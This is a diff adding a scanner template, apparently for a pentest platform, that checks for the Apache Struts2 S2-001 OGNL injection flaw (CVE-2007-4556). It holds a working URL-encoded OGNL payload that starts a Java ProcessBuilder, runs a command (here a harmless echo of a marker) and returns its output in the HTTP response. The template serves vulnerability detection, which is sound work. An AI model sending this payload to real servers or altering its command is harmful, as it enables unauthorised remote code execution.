@@ -1,0 +1,29 @@
+id: local-struts2-s2-001-cmd-rce
+
+info:
+  name: Struts2 S2-001 Command Execution via Form Validation OGNL (CVE-2007-4556)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-001 RCE via OGNL injection in form field validation re-population.
+    Uses ProcessBuilder with getWriter() to execute command and return output directly.
+  tags: safe-poc,exploit,struts2,s2-001,cve,cve2007,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login.action"
+      - "{{BaseURL}}/index.action"
+    body: "username=admin&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2001-rce%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2001-rce"
+      - type: status
+        status:
+          - 200
